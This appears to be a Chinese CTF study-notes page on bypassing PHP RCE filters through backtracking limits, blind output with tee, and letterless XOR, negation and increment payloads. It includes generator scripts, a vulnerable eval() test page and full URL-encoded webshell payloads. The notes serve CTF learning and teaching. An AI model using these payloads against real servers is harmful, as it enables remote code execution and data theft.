<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//php正则的回溯次数大于1000000次时返回False</span><br><span class="line">$a = &#x27;hello world&#x27;+&#x27;h&#x27;*1000000</span><br><span class="line">preg_match(&quot;/hello.*world/is&quot;,$a) == False</span><br></pre></td></tr></table></figure></div>
<h4 id="无回显rce"><a class="markdownIt-Anchor" href="#无回显rce">#</a> 无回显 RCE</h4>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//无回显RCE，如exce()函数，可将执行结果输出到文件再访问文件执行以下命令后访问1.txt即可</span><br><span class="line">ls / | tee 1.txt</span><br><span class="line">cat /flag | tee 2.txt</span><br><span class="line">//eval()无输出</span><br><span class="line">eval(print`c\at /flag`;)</span><br></pre></td></tr></table></figure></div>
<p>参考文章</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73185293/article/details/131557169?spm=1001.2014.3001.5506" >RCE 漏洞详解及绕过总结 (全面)-CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/2401_84466229/article/details/139718772?ops_request_misc=%7B%22request%5Fid%22%3A%22371BBCBE-D0CD-41EE-B593-139D2E5FF9EE%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=371BBCBE-D0CD-41EE-B593-139D2E5FF9EE&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139718772-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=ctf%E4%B8%AD%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E7%9A%84rce%E9%A2%98%E7%9B%AE&amp;spm=1018.2226.3001.4187" >CTF 中的 RCE_rced 在 ctf 中是什么意思 - CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>php 短标签，有三种方式：(用于 eval (&quot;?&gt;&quot;.$word); 这样的情况，用？&gt; 闭合了前面的语句)</p>
<? echo '123';?> #前提是开启配置参数short_open_tags=on
<script language="php">echo 'hello'; #不需要修改参数开关，但是只能在7.0以下可用。
<% echo '123';%> #开启配置参数asp_tags=on，并且只能在7.0以下版本使用








##### grep函数

`grep` 是 Linux 和 Unix 系统中一个非常强大的文本搜索工具，用于在文件或输入流中查找匹配指定模式的行。以下是 `grep` 的常用用法和示例：

------

### **基本语法**

bash

复制

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [选项] 模式 [文件...]</span><br></pre></td></tr></table></figure></div>

- **模式**：要搜索的字符串或正则表达式。
- **文件**：要搜索的文件（可以是一个或多个文件）。如果未指定文件，`grep` 会从标准输入读取数据。

例如这个payload

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Black-Cat-Sheriff=269afa1c6d77e37919c94f9c75a028819193c7b51aee2d46222cda81fe154538&amp;One-ear=;tac f*|grep \&#123;&amp;White-cat-monitor[]=3</span><br></pre></td></tr></table></figure></div>

题目

![image-20250303215426843](https://cdn.jsdelivr.net/gh/bae4075/Noteimage@img/img/image-20250303215426843.png)

这里用;闭合了前面的nc   之后用grep函数去匹配flag肯定会有的前大括号













%0a是换行

%09是空格





## 无字母RCE

# 前言

我们上节课学了关键字的bypass，那么有没有什么无解一点的，更加暴力一点的解法呢，这就是今天我们要讲的三件套，自增、取反、异或，这三种方法是CTF中的常考项。

# 异或RCE

环境为PHP7
 以按位疑惑为例子：

<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);  <span class="comment">//新创建一个文件，也就是rce_or.txt，给他写的权限</span></span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>); <span class="comment">//ascii的前16个字符的十六进制应该是01，02，所以在前缀加‘0’</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);  <span class="comment">//前16个后面的就不用加0了</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);   <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);      <span class="comment">//同理上方</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> =<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;     <span class="comment">//如果有符合条件的就筛掉，输出空格</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;             <span class="comment">//可以使用的字符如下</span></span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;    <span class="comment">//十六进制前加百分号就变成了URL编码格式</span></span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));  <span class="comment">//urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;          <span class="comment">//ord函数是将字符变成ASCII码</span></span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;     <span class="comment">//每次到这里都写入刚刚建立的文本内</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>







































<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()  <span class="comment"># 逐行读取文件 //每一次循环，指针都会指向下一行，输出下一行的字符</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:  <span class="comment"># 读到空，即读完跳出循环</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:  <span class="comment"># 就比如我们这边输入的arg是system，当文本当前行第一个字母是s或者y这些字符就写入s1,s2</span></span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]  <span class="comment"># 提取第一个字符串，具体可以看上面我的截图，如第一行的%00</span></span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]  <span class="comment"># 提取第二个字符串</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span>  <span class="comment"># s1和s2进行或运算就可以合成对应的字母s,y,s,t,e,m</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function:&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure></div>























首先来讲一下原理把：

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">  echo &quot;&quot;;     //如果有符合条件的就筛掉，输出空格</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else&#123;             //可以使用的字符如下</span><br><span class="line">     $a=&#x27;%&#x27;.$hex_i;    //十六进制前加百分号就变成了URL编码格式</span><br><span class="line">     $b=&#x27;%&#x27;.$hex_j;</span><br><span class="line">     $c=(urldecode($a)^urldecode($b));  //urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符</span><br></pre></td></tr></table></figure></div>









主要的PHP代码在这里，这段代码的意思是利用hex2bin来获取filter以外的字符，如空白字符，一些乱码之类的，但是这些字符都有对应的二进制数字，所以可以进行取反，异或之类的操作

举个栗子吧，以脚本生成的结果中调几个来看：
 ![image.png](https://www.nssctf.cn/files/2024/1/24/0f3189c549.png)
 看到92行，意思就是%04|%27的结果URL解码后就是#
 在本地测试一下看看：

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo hex2bin(&#x27;04&#x27;).&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo hex2bin(&#x27;27&#x27;).&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo (urldecode(&#x27;%04&#x27;)^urldecode(&#x27;%27&#x27;));</span><br><span class="line">?&gt;	</span><br></pre></td></tr></table></figure></div>







![image.png](https://www.nssctf.cn/files/2024/1/24/05826c6d7a.png)
 从结果来看就是那些满足filter条件的字符，不是数字也不是字母，是一些特殊符号和乱码，如果filter中过滤了特殊符号，那就修改一下脚本即可

用两个乱码合成了一个#，可以这么理解
 最后再来谈谈结果的原理：
 ![image.png](https://www.nssctf.cn/files/2024/1/24/555bf2bb7e.png)
 (“%0f%08%0f%09%0e%06%0f”^“%7f%60%7f%60%60%60%60”)(“%0b”^“%3a”)
 就好比我们的system('ls)，我们看看这一堆东西输入进去后为什么会变成答案？
 首先URL会帮你解码一次，我感到好奇的是双引号的作用，本地测试一下

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">echo $code;</span><br><span class="line">if(preg_match(&#x27;/[a-z0-9]/i&#x27;,$code))&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">eval($code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>











我们payload：?code=(“%0f%08%0f%09%0e%06%0f”^“%7f%60%7f%60%60%60%60”)(“%0b”^“%3a”);
 ![image.png](https://www.nssctf.cn/files/2024/1/24/f847c3f0c2.png)
 看得到结果输出的code是一滩乱码，这是因为被URL解码过了，由于这些乱码我们都没过滤，所以可以满足条件
 猜测是在eval内完成了异或的操作
 本地测试一下能否进行异或操作：

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urldecode(&quot;%0f%08%0f%09%0e%06%0f&quot;)^urldecode(&quot;%7f%60%7f%60%60%60%60&quot;);</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo urldecode(&quot;%0b&quot;)^urldecode(&quot;%3a&quot;);</span><br><span class="line">?&gt;   </span><br></pre></td></tr></table></figure></div>







![image.png](https://www.nssctf.cn/files/2024/1/24/59a7d4123d.png)
 是可行的，都解出来了，这样对原理就清楚了

# 取反RCE

在php内取反很方便，因为php内可以取反字符串，而在python内就显得麻烦的多，取反脚本如下：

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//在命令行中运行</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); </span><br><span class="line"></span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure></div>

















意思就是先对输入的字符串进行取反，我们payload时二次取反达到还原的目的，
 了解一下取反的原理：

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo ~&#x27;phpinfo()&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>





![image.png](https://www.nssctf.cn/files/2024/1/24/64776e473d.png)
 可以看到是乱码！所以可以绕过preg_match的过滤，我们把这乱码二次取反后：

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=~&#x27;phpinfo();&#x27;;</span><br><span class="line">echo ~$a;</span><br><span class="line">?&gt;</span><br><span class="line">    </span><br></pre></td></tr></table></figure></div>







![image.png](https://www.nssctf.cn/files/2024/1/24/4cffdfb95a.png)
 可以还原，和上面的异或其实是一个意思

# 自增RCE

[RCE篇之无数字字母rce_mb5fd86d5f5874e的技术博客_51CTO博客](https://blog.51cto.com/u_15057851/4220892)
 参考以上文章

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].[]; //俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span><br><span class="line">$__=&#x27;&#x27;;  //两个短杠赋值为空</span><br><span class="line">$_=$_[&#x27;&#x27;];//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span><br><span class="line">$_=++$_; //b</span><br><span class="line">$_=++$_; //c</span><br><span class="line">$_=++$_; //d</span><br><span class="line">$_=++$_; //e</span><br><span class="line">$__.=$_; //E  把两个短杠赋值为E</span><br><span class="line">$_=++$_; //F  一个短杠继续自增</span><br><span class="line">$_=++$_; //G </span><br><span class="line">$__=$_.$__; // GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span><br><span class="line">$_=++$_; //H 此处一个短杠继续自增，为H</span><br><span class="line">$_=++$_; //I</span><br><span class="line">$_=++$_; //J</span><br><span class="line">$_=++$_; //k</span><br><span class="line">$_=++$_; //L</span><br><span class="line">$_=++$_; //M</span><br><span class="line">$_=++$_; //N</span><br><span class="line">$_=++$_; //O</span><br><span class="line">$_=++$_; //P</span><br><span class="line">$_=++$_; //Q</span><br><span class="line">$_=++$_; //R</span><br><span class="line">$_=++$_; //S</span><br><span class="line">$_=++$_; //T</span><br><span class="line">$__.=$_; // GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span><br><span class="line">$&#123;&#x27;_&#x27;.$__&#125;[_]($&#123;&#x27;_&#x27;.$__&#125;[__]); // 进行拼接，$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</span><br></pre></td></tr></table></figure></div>































<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span><br><span class="line">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&#x27;_&#x27;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br><span class="line"></span><br><span class="line">url编码后：</span><br><span class="line">%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b